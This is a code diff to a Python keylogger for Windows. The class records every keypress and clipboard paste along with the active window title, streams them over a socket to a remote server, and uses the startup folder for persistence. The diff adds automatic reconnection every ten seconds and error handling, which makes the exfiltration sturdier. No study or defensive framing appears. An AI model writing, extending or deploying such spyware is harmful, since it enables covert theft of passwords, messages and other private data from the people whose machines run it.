@@ -10,13 +10,26 @@ import pyperclip
 from client import ClientSocket
 import socket
 import win32gui
+import time
 
 class KeyLogger:
     def __init__(self):
         self.user = getpass.getuser()
         self.startupDir = winshell.startup()
         self.oldPaste = ""
-        self.client = ClientSocket()
+        self.connect_socket()
+
+
+    def connect_socket(self):
+        while True:       
+            try:
+                self.client = ClientSocket()
+                return True
+            except:
+                print("Failed setting up socket, trying again in 10 seconds...")
+                time.sleep(10)
+                continue
+
 
     def create_shortcut(self):
         if os.path.isfile("main.exe"):
@@ -46,12 +59,16 @@ class KeyLogger:
         paste = pyperclip.paste()
         window = self.get_active_window()
 
-        if key == keyboard.Key.ctrl_l:
-            if paste != self.oldPaste:
-                self.oldPaste = paste
-                self.client.send_message(f"{time} | {window} | Paste - {paste}\n")
-        else:
-            self.client.send_message(f"{time} | {window} | Key - {key}\n")
+        try:
+            if key == keyboard.Key.ctrl_l:
+                if paste != self.oldPaste:
+                    self.oldPaste = paste
+                    self.client.send_message(f"{time} | {window} | Paste - {paste}\n")
+            else:
+                self.client.send_message(f"{time} | {window} | Key - {key}\n")
+        except:
+            print("No connection to server!")
+            self.connect_socket()
 
     def key_listener(self):
         with keyboard.Listener(on_press=self.on_press) as kl:
